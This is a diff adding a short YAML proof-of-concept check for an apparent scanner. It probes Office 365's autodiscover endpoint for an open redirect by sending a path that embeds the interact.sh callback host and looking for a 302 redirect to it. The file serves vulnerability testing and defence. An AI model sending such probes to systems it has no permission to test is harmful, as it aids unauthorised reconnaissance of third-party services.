@@ -1,0 +1,15 @@
+name: poc-yaml-office365-open-redirect
+manual: true
+transport: http
+set:
+  r1: randomInt(1, 9999)
+rules:
+  - method: GET
+    path: "/autodiscover/autodiscover.json/v1.0/{{r1}}@interact.sh?Protocol=Autodiscoverv1"
+    follow_redirects: false
+    expression: |
+      'autodiscover.interact.sh' in response.headers && response.status == 302
+detail:
+  author: txf(https://github.com/tangxiaofeng7)
+  links:
+    - https://github.com/Raikia/UhOh365
